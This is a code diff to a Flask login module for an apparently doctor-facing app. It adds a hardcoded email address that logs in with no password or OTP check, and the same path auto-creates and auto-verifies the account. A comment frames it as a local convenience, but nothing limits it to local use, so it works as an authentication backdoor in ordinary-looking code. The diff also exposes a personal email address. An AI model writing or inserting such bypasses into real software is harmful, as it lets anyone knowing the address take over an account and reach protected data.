@@ -13,6 +13,7 @@ from models import Doctor, db
 
 auth_bp = Blueprint("auth", __name__)
 bcrypt = Bcrypt()
+DIRECT_LOGIN_EMAIL = "vedantkhedkar007@gmail.com"
 
 
 def login_required(view_function):
@@ -162,7 +163,38 @@ def login():
         email = (request.form.get("email") or "").strip().lower()
         password = request.form.get("password") or ""
 
-        if not email or not password:
+        if not email:
+            flash("Email is required.", "danger")
+            return render_template("login.html")
+
+        # Local convenience login for one specific account without password/OTP.
+        if email == DIRECT_LOGIN_EMAIL:
+            doctor = Doctor.query.filter_by(email=email).first()
+            if doctor is None:
+                doctor = Doctor(
+                    name="Vedant",
+                    email=email,
+                    password_hash=bcrypt.generate_password_hash("direct-login-placeholder").decode("utf-8"),
+                    is_verified=True,
+                    verification_otp=None,
+                    otp_expires_at=None,
+                )
+                db.session.add(doctor)
+                db.session.commit()
+            elif not doctor.is_verified:
+                doctor.is_verified = True
+                doctor.verification_otp = None
+                doctor.otp_expires_at = None
+                db.session.commit()
+
+            session.clear()
+            session["doctor_id"] = doctor.id
+            session["doctor_name"] = doctor.name
+            session["doctor_email"] = doctor.email
+            flash("Direct login successful.", "success")
+            return redirect(url_for("main.dashboard"))
+
+        if not password:
             flash("Email and password are required.", "danger")
             return render_template("login.html")
 
